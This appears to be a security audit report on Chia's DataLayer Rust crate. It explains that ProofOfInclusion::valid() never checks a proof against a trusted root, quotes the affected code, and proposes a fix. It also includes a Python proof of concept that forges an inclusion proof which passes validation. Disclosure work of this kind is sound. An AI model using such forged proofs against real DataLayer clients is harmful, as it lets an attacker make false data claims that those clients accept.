### Title
`ProofOfInclusion::valid()` Never Verifies Against a Trusted Root — Forged Proofs Always Pass - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` contains a tautological final check that makes it verify only the internal self-consistency of the proof chain, never comparing the computed root against any external trusted root hash. An attacker can construct a fully fabricated `ProofOfInclusion` for any arbitrary `node_hash` and any arbitrary key/value pair, and `valid()` will return `true`. The struct is `Streamable`-deserializable and exposed to Python via the wheel, giving untrusted input a direct entry path.

### Finding Description

`ProofOfInclusion::valid()` is implemented as follows: [1](#0-0) 

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← returns the proof's OWN field
    } else {
        self.node_hash
    }
}

pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = calculate_internal_hash(
            &existing_hash, layer.other_hash_side, &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;          // ← only internal consistency check
        }
        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()   // ← TAUTOLOGY
}
```

After the loop body, `existing_hash` holds the last `calculated_hash`. The loop already asserted `calculated_hash == layer.combined_hash` for every layer, so after the final iteration `existing_hash == last.combined_hash`. `root_hash()` returns exactly `last.combined_hash`. Therefore the final comparison `existing_hash == self.root_hash()` is **unconditionally true** whenever the loop completes without returning `false`.

The method never accepts a trusted root parameter and never compares the computed root against any externally anchored value. The only thing `valid()` proves is that the proof's own fields are mutually consistent — a property the attacker controls entirely.

The struct is `Streamable`-deserializable and constructable from Python: [2](#0-1) [3](#0-2) 

The Python wheel exposes `valid()` and `root_hash()` as the sole verification interface, with no `valid_against_root(trusted_root)` method: [4](#0-3) 

### Impact Explanation

Any DataLayer client that calls `proof.valid()` to verify a proof received from a peer will accept a completely fabricated proof. The attacker can claim any key maps to any value in any DataLayer store, and the proof will pass the only verification gate the API provides. This allows untrusted input to prove invalid state — matching the allowed High impact: *"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."*

### Likelihood Explanation

The `valid()` method is the sole verification method on `ProofOfInclusion`. There is no `valid_against_root(trusted_root: Hash) -> bool` variant. The method name implies completeness. Every caller that relies on `valid()` alone — including any Python DataLayer client that deserializes a peer-supplied proof and calls `proof.valid()` — is vulnerable. The `Streamable` derive makes deserialization from arbitrary bytes trivial. [5](#0-4) 

### Recommendation

Replace the tautological final check with a comparison against a caller-supplied trusted root:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == trusted_root   // compare against EXTERNAL trusted root
}
```

Deprecate or remove the current `valid()` method, or make it require a trusted root argument. Update the Python binding accordingly. All call sites that currently call `proof.valid()` must be updated to supply the on-chain root hash of the DataLayer store being verified.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer
import hashlib

# Attacker-chosen arbitrary leaf hash (not in any real tree)
fake_node_hash = bytes([0xAA] * 32)
fake_other_hash = bytes([0xBB] * 32)

# Attacker computes a consistent combined_hash using the same
# calculate_internal_hash logic (Side::Right → hash(existing || other))
h = hashlib.sha256()
h.update(fake_node_hash)
h.update(fake_other_hash)
fake_combined_hash = h.digest()

layer = ProofOfInclusionLayer(
    other_hash_side=1,           # Side::Right
    other_hash=fake_other_hash,
    combined_hash=fake_combined_hash,
)

forged_proof = ProofOfInclusion(node_hash=fake_node_hash, layers=[layer])

# valid() returns True for a completely fabricated proof
assert forged_proof.valid(), "Expected True — forged proof passes validation"

# root_hash() returns the attacker-controlled fake_combined_hash,
# not the real on-chain DataLayer root. No check enforces they match.
print("Forged root:", forged_proof.root_hash().hex())
```

The `valid()` call returns `True` unconditionally because the tautological final check `existing_hash == self.root_hash()` reduces to `fake_combined_hash == fake_combined_hash`. [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L13-28)
```rust
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusionLayer {
    pub other_hash_side: Side,
    pub other_hash: Hash,
    pub combined_hash: Hash,
}

#[cfg_attr(
    feature = "py-bindings",
    pyclass(get_all, from_py_object),
    derive(PyJsonDict, PyStreamable)
)]
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusion {
    pub node_hash: Hash,
    pub layers: Vec<ProofOfInclusionLayer>,
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L31-58)
```rust
impl ProofOfInclusion {
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }

    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** wheel/python/chia_rs/datalayer.pyi (L236-266)
```text
@final
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...

    def __new__(cls, node_hash: bytes32, layers: list[ProofOfInclusionLayer]) -> ProofOfInclusion: ...

    # TODO: generate
    def __hash__(self) -> int: ...
    def __repr__(self) -> str: ...
    def __deepcopy__(self, memo: object) -> Self: ...
    def __copy__(self) -> Self: ...
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self: ...
    @classmethod
    def from_bytes_unchecked(cls, blob: bytes) -> Self: ...
    @classmethod
    def parse_rust(cls, blob: ReadableBuffer, trusted: bool = False) -> tuple[Self, int]: ...
    def to_bytes(self) -> bytes: ...
    def __bytes__(self) -> bytes: ...
    def stream_to_bytes(self) -> bytes: ...
    def get_hash(self) -> bytes32: ...
    def to_json_dict(self) -> dict[str, Any]: ...
    @classmethod
    def from_json_dict(cls, json_dict: dict[str, Any]) -> Self: ...
    def replace(self, *, node_hash: bytes32 = ..., layers: list[ProofOfInclusionLayer] = ...) -> Self: ...
    def truncate(self, field: str, length: int) -> None: ...
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L1155-1196)
```rust
    pub fn get_proof_of_inclusion(
        &self,
        key: KeyId,
    ) -> Result<proof_of_inclusion::ProofOfInclusion, Error> {
        let mut index = *self
            .block_status_cache
            .get_index_by_key(key)
            .ok_or(Error::UnknownKey(key))?;

        let node = self
            .get_node(index)?
            .expect_leaf("key to index mapping should only have leaves");

        let parents = self.get_lineage_blocks_with_indexes(index)?;
        let mut layers: Vec<proof_of_inclusion::ProofOfInclusionLayer> = Vec::new();
        let mut parents_iter = parents.iter();
        // first in the lineage is the index itself, second is the first parent
        parents_iter.next();
        for (next_index, block) in parents_iter {
            if block.metadata.dirty {
                return Err(Error::Dirty(*next_index));
            }
            let parent = block
                .node
                .expect_internal("all nodes after the first should be internal");
            let sibling_index = parent.sibling_index(index)?;
            let sibling_block = self.get_block(sibling_index)?;
            let sibling = sibling_block.node;
            let layer = proof_of_inclusion::ProofOfInclusionLayer {
                other_hash_side: parent.get_sibling_side(index)?,
                other_hash: sibling.hash(),
                combined_hash: parent.hash,
            };
            layers.push(layer);
            index = *next_index;
        }

        Ok(proof_of_inclusion::ProofOfInclusion {
            node_hash: node.hash,
            layers,
        })
    }
```
